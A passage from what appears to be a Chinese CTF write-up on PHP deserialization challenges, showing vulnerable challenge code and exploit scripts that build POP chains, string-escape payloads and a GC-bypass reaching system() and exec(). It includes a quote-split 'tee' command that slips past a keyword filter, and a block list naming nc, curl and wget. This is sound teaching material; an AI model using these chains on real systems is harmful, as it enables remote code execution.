    <span class="token keyword">private</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>

        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//触发Super类的__invoke()方法</span>
    <span class="token punctuation">&#125;</span>
<span class="token comment">/*
    public function __toString()
    &#123;
        ($this->func)();
        return "Good Job!";
	&#125;
*/</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Handle</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//触发CTF类的end()方法</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Super</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//触发Handle类的__call方法</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">getStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"==GAME OVER=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">WhiteGod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//触发WhiteGod类的__unset()方法</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">-></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">WhiteGod</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">;</span>
    
<span class="token comment">/*
    public function __unset($var)
    &#123;
        ($this->func)($this->var);    
    &#125;

*/</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/7f0db6a827154668acf8b1903b310613.png" alt="456"></p>
<h3 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!!"></a>R!!!C!!!E!!!!</h3><p>存在非预期</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">minipop</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$qwejaskdjnlka</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"alright"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">qwejaskdjnlka</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//wanna try?</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">minipop</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$qwejaskdjnlka</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">minipop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">=</span><span class="token string double-quoted-string">"cat /flag_is_h3eeere | te''e /var/www/html/1"</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">qwejaskdjnlka</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后访问&#x2F;1文件得到flag。</p>
<h2 id="week4-web"><a href="#week4-web" class="headerlink" title="week4-web"></a>week4-web</h2><h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><p>知识点：字符串逃逸</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当给key随便赋一个值时</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'456789789'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//运行结果：O:7:"GetFlag":2:&#123;s:3:"key";s:9:"456789789";s:3:"cmd";s:6:"whoami";&#125;n0rt6\86159</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果后面的<code>whoami</code>能够让我们控制来进行命令执行，那目的就达到了。<br><code>&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>总共26个字符，<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>总共29个字符。<br>waf函数功能可以将bad换为good，也就增加了一个字符。<br>那么使用29个字符就是用29个bad，正好把<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>顶出去了，从而达到执行命令的效果<br>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";&#125;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/38746d4f57ca42c7934536d2694d8579.png" alt="123"></p>
<h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><p>知识点：反序列化、GC回收</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not Flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$wel</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token property">good</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"NewStar"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fast'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nope"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>找入口：<code>__destruct()</code><br>找出口：<code>evil()</code><br>链子：</p>
<blockquote>
<p><code>Start-&gt;Crypto-&gt;Reverse-&gt;Pwn-&gt;Web</code></p>
</blockquote>
<p>要绕过<code>throw new Exception(&quot;Nope&quot;);</code>，这里throw就是GC回收。<br>在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。<br>当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。<br>exp</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$p</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$r</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Crypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token variable">$r</span><span class="token operator">-></span><span class="token property">func</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token variable">$p</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$w</span><span class="token punctuation">;</span>
